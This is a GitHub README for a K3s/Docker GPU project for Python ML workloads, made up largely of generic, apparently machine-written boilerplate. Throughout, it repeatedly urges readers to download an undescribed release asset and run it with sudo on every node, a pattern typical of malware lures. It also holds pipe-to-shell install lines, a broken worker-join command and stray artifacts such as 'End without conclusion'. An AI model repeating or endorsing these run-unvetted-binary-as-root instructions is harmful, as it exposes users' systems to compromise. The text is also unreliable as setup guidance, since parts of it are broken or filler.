https://github.com/OscarAraque/k3s-docker-gpu/releases

[![Releases](https://img.shields.io/badge/releases-v1.0.0-blue?logo=github)](https://github.com/OscarAraque/k3s-docker-gpu/releases)

# Production-Grade GPU Python in Docker on K3s for ML Ops AI

A robust, production-ready framework to run GPU-accelerated Python workloads inside Docker containers on K3s clusters. This project blends lightweight Kubernetes orchestration with GPU support to deliver consistent, scalable ML and data science pipelines in real world environments.

- Topics: devops, docker, gpu, infrastructure, k3s, kubernetes, machine-learning, mlops, production-ready, python
- Link to releases: https://github.com/OscarAraque/k3s-docker-gpu/releases

Embrace a calm, steady approach to deploying GPU workloads on a compact Kubernetes distribution. This repository provides a repeatable pattern for provisioning nodes, enabling GPU access inside containers, and running Python-based ML workloads with predictable performance.

If you need the latest assets, visit the Releases page here: https://github.com/OscarAraque/k3s-docker-gpu/releases. The assets you download from that page are designed to be executed directly on your cluster nodes. If the link ever fails, head to the Releases section of the repository to locate the most recent release and the corresponding assets.

Table of contents
- Overview and goals
- Why GPU on K3s
- Architecture and components
- Getting started
- Run a GPU-enabled Python workload
- Best practices for production
- Observability, logging, and monitoring
- Security and hardening
- Testing, validation, and QA
- CI/CD and automation
- Contributing
- Roadmap
- License
- Releases and asset handling

Overview and goals
This project aims to make GPU-accelerated Python work easy to operate in a compact Kubernetes environment. K3s provides a lightweight control plane, which is ideal for edge data centers, remote clusters, and small-to-medium scale infrastructure. The GPU-tuned layer ensures that Python workloads—think TensorFlow, PyTorch, RAPIDS, and other CUDA-enabled libraries—can run with high throughput and low latency inside Docker containers managed by Kubernetes.

The core goals include:
- Predictable deployment in diverse environments, from bare-metal to cloud-like clusters.
- Simple, repeatable setup that reduces the friction of GPU provisioning.
- Clear separation of responsibilities between cluster operations, container runtime, and application workloads.
- Minimal maintenance overhead with good observability and rollback options.
- Production-ready defaults that emphasize reliability, security, and performance.

Why GPU on K3s
K3s offers a compact, easy-to-manage Kubernetes distribution. At the same time, GPUs unlock a wide range of workloads, from model training to real-time inference. Running GPU workloads in containers brings several benefits:
- Reproducibility: Containerized environments capture dependencies and configurations.
- Isolation: GPU resources can be allocated per-pod, preventing contention.
- Portability: The same workload can run on edge clusters or more powerful data centers with minimal changes.
- Consistency: You get uniform deployment pipelines for development, staging, and production.
- Observability: Centralized metrics and logs help you understand performance and bottlenecks.

This project stitches together GPU-enabled runtimes, NVIDIA device plugins, container tooling, and Kubernetes manifests so you can deploy Python-based ML and data processing pipelines with confidence. It’s designed to be production-ready, not a quick prototype. It assumes you manage the cluster as you would in a typical DevOps workflow: versioned changes, automated testing, and careful monitoring.

Architecture and components
The architecture blends a few well-known building blocks into a cohesive workflow. Here is a high-level view of the essential components and how they interact.

- K3s cluster
  - A lean Kubernetes distribution that runs a lightweight control plane and worker nodes.
  - Provides API, scheduling, and orchestration for GPU-enabled pods.
  - Supports role-based access control and namespace isolation to segment workflows.

- Node setup and GPU provisioning
  - Each cluster node with GPU hardware has the NVIDIA drivers installed at the host level.
  - The NVIDIA container toolkit and NVIDIA device plugin enable Kubernetes to allocate GPUs to containers.
  - The setup ensures that CUDA-enabled Python workloads see the expected GPU devices inside containers.

- Docker as container runtime
  - The runtime supports GPU-accelerated containers through the NVIDIA Container Toolkit.
  - Containers specify GPU requirements via Kubernetes resources, such as nvidia.com/gpu.

- NVIDIA device plugin for Kubernetes
  - A small daemon that advertises available GPUs to the Kubernetes scheduler.
  - Allows pods to request GPUs on demand and ensures devices are properly isolated.

- NVIDIA Container Toolkit
  - Bridges the host GPU drivers with container runtimes.
  - Ensures CUDA libraries and drivers are accessible inside the container without bundling a full driver stack.

- GPU-enabled Python workloads
  - Workloads may use frameworks like PyTorch, TensorFlow, RAPIDS, CuPy, and other CUDA-enabled libraries.
  - Python applications run inside Docker containers with GPU access granted by the runtime and Kubernetes scheduling.

- Storage and data access
  - Workloads commonly consume data from distributed storage, object storage, or mounted volumes.
  - The setup provides clear patterns for persistent volumes and data locality considerations.

- Networking and security
  - Network policies and namespace isolation help control traffic between services.
  - Secrets and config maps manage credentials and configuration safely.
  - Observability tooling is integrated to monitor resource usage, GPU health, and job status.

- Observability and metrics
  - Prometheus and Loki-like components collect metrics and logs from pods and nodes.
  - GPU metrics provide visibility into GPU utilization, memory usage, and temperature where supported.

- CI/CD integration
  - The pipeline can build, test, and deploy GPU workloads in a repeatable manner.
  - GitOps-style flows are supported to align with modern DevOps practices.

Getting started
This section walks you through the essential steps to get a minimal, GPU-enabled Python workload up and running on a K3s cluster. The steps assume you have at least one GPU-equipped node and that you have administrator access to the cluster.

- Prerequisites
  - Linux-based cluster nodes with NVIDIA GPUs.
  - Root or sudo access on each node.
  - NVIDIA drivers installed on the host (matching your GPU and OS).
  - Basic Kubernetes and kubectl knowledge.
  - A working network between cluster nodes.

- Download the release asset
  - The project distributes pre-baked assets that configure the cluster for GPU workloads. From the Releases page, download the asset that matches your environment. The asset is designed to be executed on each target node to install the necessary components and bootstrap the GPU support stack.
  - The Releases page URL is the official source for these assets: https://github.com/OscarAraque/k3s-docker-gpu/releases
  - After downloading, make the file executable and run it on each node:
    - chmod +x path/to/asset.sh
    - sudo path/to/asset.sh
  - Repeat this on all nodes that will participate in the GPU workload.

- Initialize the cluster (if starting fresh)
  - On a control plane node, install K3s with the minimal controls suitable for GPU workloads:
    - curl -sfL https://get.k3s.io | sh -
  - On worker nodes, join the cluster using the token provided by the control plane:
    - K3S_URL=https://<control-plane-ip>:6443 K3S_TOKEN=<token> sh -s - agent
  - Ensure that the cluster has at least one node with a GPU. You can verify with:
    - kubectl get nodes
    - kubectl describe node <node-name> | grep -i gpu

- Install NVIDIA software on the host
  - You must install the NVIDIA driver on the host machines prior to using the NVIDIA container toolkit.
  - Install NVIDIA container runtime to enable GPU access in containers:
    - For Debian/Ubuntu:
      - distribution=$(. /etc/os-release; echo $ID$VERSION_ID)
      - curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -
      - curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list
      - sudo apt-get update
      - sudo apt-get install -y nvidia-docker2
      - sudo systemctl restart docker
    - For RHEL/CentOS:
      - similar steps with appropriate package manager
  - Confirm the runtime is available:
    - docker run --rm --gpus all nvidia/cuda:11.0-base nvidia-smi
  - Note: In a pure containerd-based K3s setup, you may configure the container runtime to use the NVIDIA runtime as the default for GPU workloads.

- Deploy the GPU device plugin
  - The NVIDIA device plugin registers GPUs with the Kubernetes API. Deploy the plugin as a DaemonSet so every GPU node runs an instance.
  - Apply the manifest:
    - kubectl apply -f https://raw.githubusercontent.com/NVIDIA/k8s-device-plugin/master/nvidia-device-plugin.yml
  - Verify:
    - kubectl get ds -n kube-system
    - kubectl describe node <gpu-node-name> | grep -i nvidia

- Run a simple GPU-enabled workload
  - Create a simple pod that requires a GPU. Here is a minimal example:
    - apiVersion: v1
      kind: Pod
      metadata:
        name: gpu-test
      spec:
        containers:
        - name: cuda-vector-add
          image: nvidia/cuda:11.0-base
          resources:
            limits:
              nvidia.com/gpu: 1
          command: ["bash", "-lc", "python3 -c 'print(\"hello from GPU\")'"]
  - Apply:
    - kubectl apply -f gpu-test.yaml
  - Check status:
    - kubectl get pods
    - kubectl logs gpu-test

- Run a production-grade Python workload
  - Build or pull a Python image that includes CUDA libraries (e.g., PyTorch with CUDA, TensorFlow-GPU, or RAPIDS).
  - Create a Deployment that requests GPUs for the Python container.
  - Use persistent volumes for data, and configure a pipeline to pull data, process on GPU, and store results.
  - Example Deployment manifest (simplified):
    - apiVersion: apps/v1
      kind: Deployment
      metadata:
        name: gpu-python-deploy
      spec:
        replicas: 2
        selector:
          matchLabels:
            app: gpu-python
        template:
          metadata:
            labels:
              app: gpu-python
          spec:
            containers:
            - name: ml-runner
              image: your-org/pycuda-workload:latest
              resources:
                limits:
                  nvidia.com/gpu: 1
              env:
              - name: DATA_PATH
                value: /data/input
              - name: OUTPUT_PATH
                value: /data/output
              volumeMounts:
              - mountPath: /data
                name: data
            volumes:
            - name: data
              persistentVolumeClaim:
                claimName: data-pvc
  - Apply:
    - kubectl apply -f gpu-python-deploy.yaml
  - Validate:
    - kubectl get pods
    - kubectl logs deployment/gpu-python-deploy

Best practices for production
- Resource management
  - Use requests and limits carefully. Assign GPUs using the nvidia.com/gpu resource key and set both requests and limits to the same value to ensure scheduling predictability.
  - Tune CPU and memory limits to prevent container starvation and to keep the node healthy under pressure.

- Scheduling and affinity
  - Label GPU nodes and use node selectors or taints/tolerations to ensure GPU workloads land on the right nodes.
  - Consider anti-affinity for workloads that should not share a single GPU host.

- Data management
  - Use a robust storage strategy for training data, model checkpoints, and intermediate results.
  - Implement data versioning and backups as part of your pipeline.

- Secrets and configuration
  - Store sensitive configuration in Kubernetes Secrets, not in code.
  - Use ConfigMaps for non-sensitive configuration.

- Continuous integration and delivery
  - Build container images in a controlled environment.
  - Run GPU-friendly tests that exercise both CPU and GPU branches of your code.
  - Automate deployment to staging and production with a clear promotion path.

- Observability
  - Collect metrics on GPU utilization, memory usage, and temperature where supported.
  - Centralize logs for quick triage and long-term analysis.
  - Set up alerts for anomalous GPU behavior, job failures, or resource saturation.

- Security
  - Apply the principle of least privilege for service accounts and roles.
  - Regularly rotate credentials and RLs used by pipelines.
  - Keep host and container runtimes patched.

- Performance and tuning
  - Profile your workloads to identify bottlenecks in data transfer, kernel launches, or micro-batching.
  - Use mixed precision or reduced-precision arithmetic where safe to gain speed and reduce memory use.
  - Align resource requests with actual workload patterns.

Observability, logging, and monitoring
- Core metrics
  - Node health, CPU, memory, and network usage
  - GPU utilization, memory, temperature
  - Pod-level resource consumption and GPU allocation status

- Tools and dashboards
  - Prometheus for metrics collection
  - Grafana for dashboards
  - Loki or similar log aggregators for centralized logs
  - NVIDIA telemetry tooling when supported on your hardware

- Logs and tracing
  - Enable structured logs from Python apps for easier parsing.
  - If your workload uses distributed components, consider tracing across services to identify bottlenecks.

Security and hardening
- Name spaces and RBAC
  - Use separate namespaces for development, testing, and production.
  - Limit role-based access to only what is required for each team.

- Secrets management
  - Store keys, tokens, and credentials in Kubernetes Secrets.
  - Encrypt Secrets at rest when supported by your cluster provider.

- Image provenance
  - Sign and verify container images if possible.
  - Pin to specific image tags or digests to avoid unexpected updates.

- Node hardening
  - Keep the host OS updated.
  - Disable unnecessary services on GPU nodes.
  - Restrict access to management ports to trusted networks.

Testing, validation, and QA
- Unit tests for libraries and functions
  - Ensure Python code paths exercise both CPU and GPU code branches.
  - Validate CUDA kernel behavior if you implement custom kernels.

- Integration tests
  - Validate end-to-end data flow from data ingestion to model inference.
  - Test scaling by increasing replica counts and simulating multi-user workloads.

- Performance validation
  - Compare training times and inference latency against baselines.
  - Check memory footprint, page faults, and GPU memory fragmentation.

- Disaster recovery tests
  - Simulate node failures and verify pod rescheduling to healthy GPUs.
  - Test backup, restore, and data integrity procedures.

CI/CD and automation
- Pipelines
  - Build GPU-enabled images in a controlled CI environment.
  - Run tests that exercise GPU workloads, including small training runs.
  - Push validated images to a registry and trigger deployment to staging or production.

- GitOps workflows
  - Use Git as the single source of truth for manifests.
  - Apply changes automatically to clusters with pull request gates and automated tests.

- Release management
  - Tag releases consistently and document breaking changes.
  - Provide migration guides when upgrade steps are required.

Contributing
- Set up a local development environment
  - Use a local multi-node kind of environment or a lightweight cluster to test changes.
  - Run a minimal GPU-enabled workload to verify behavior.

- Guidelines
  - Write tests for new features and for regression cases.
  - Keep changes backwards-compatible whenever possible.
  - Document any breaking changes and provide examples.

- Code quality
  - Follow consistent style guides for Python and shell scripts.
  - Include meaningful unit tests and integration tests.

Roadmap
- Improve GPU support on edge devices with limited power budgets.
- Expand compatibility with different CUDA versions and driver stacks.
- Enhance deployment automation with more robust CI/CD templates.
- Provide more ready-to-run sample workloads, including NLP and computer vision examples.

License
- The repository uses an open license suitable for collaboration and redistribution. Modify licenses as needed for your project and team.

Releases and asset handling
- Where to find assets
  - The official releases page hosts the pre-built assets and installation scripts. These assets are intended to be executed on the target cluster nodes to configure GPU support and integration with K3s.
  - If the link to the releases page stops working for any reason, check the repository's Releases section for the latest assets and instructions.
- How to use assets
  - Download the asset that matches your environment from the Releases page.
  - Make it executable and run it on each cluster node that will participate in GPU workloads.
  - The asset will install or configure the necessary components, including the NVIDIA container runtime, the device plugin, and setup for Docker or containerd as the runtime.
- Post-install checks
  - Verify that the NVIDIA drivers are loaded on each node.
  - Confirm that the NVIDIA device plugin is running as a DaemonSet in the kube-system namespace.
  - Validate GPU visibility from a simple test pod that requests a GPU.

Images and visuals
- Kubernetes logo
  - ![Kubernetes](https://upload.wikimedia.org/wikipedia/commons/3/39/Kubernetes_logo_without_workmark.svg)
- NVIDIA logo
  - ![NVIDIA](https://upload.wikimedia.org/wikipedia/commons/2/2a/NVIDIA-Logo.svg)
- Architectural diagram
  - A simple diagram can be added here when available, illustrating the GPU-enabled workload flow from data ingestion to model serving within the K3s cluster.

Sample workload templates
- GPU test pod (short)
  - This pod checks basic GPU visibility and a tiny CUDA operation.
  - apiVersion: v1
    kind: Pod
    metadata:
      name: gpu-test-pod
    spec:
      containers:
      - name: cuda-test
        image: nvidia/cuda:11.0-base
        resources:
          limits:
            nvidia.com/gpu: 1
        command: ["bash", "-lc", "nvidia-smi && echo GPU test complete"]

- Simple PyTorch inference on GPU
  - apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: pytorch-infer
    spec:
      replicas: 2
      selector:
        matchLabels:
          app: pytorch-infer
      template:
        metadata:
          labels:
            app: pytorch-infer
        spec:
          containers:
          - name: infer
            image: your-org/pytorch-inference:latest
            resources:
              limits:
                nvidia.com/gpu: 1
            command: ["python", "inference.py"]

Additional notes
- Compatibility
  - The guidance here assumes modern Linux distributions and recent NVIDIA driver stacks. If you manage a mixed cluster, consider testing each combination of kernel version, driver version, and CUDA toolkit to identify any edge cases early.
- Environment parity
  - Keep your development, staging, and production environments as close as possible. Use the same base images, the same Python dependencies, and similar data shapes to minimize drift between environments.
- Observability first
  - Build dashboards that surface GPU health, container performance, and model inference metrics. An observable system makes it easier to detect anomalies and respond quickly.

End without conclusion

- If you need to locate assets after a link issue, consult the Releases section of this repository. The Releases page is the canonical source for install scripts and binary assets that enable GPU workloads on K3s clusters. Always review the release notes for any breaking changes or upgrade steps.
- For ongoing improvements, you can open pull requests with concrete changes, add tests that cover GPU behavior, and propose enhancements to scheduling policies, data pipelines, or workload templates.

Note on usage of the primary link
- The key release source is the official Releases page. Use that page to download the appropriate asset and then execute it on every node that will run GPU workloads. If you run into any trouble accessing the asset, the Releases section in the repository is the next best place to look for guidance and updated assets. The page you visited at the start provides the official entry point for these assets and serves as a central reference for versions, changelogs, and deployment instructions.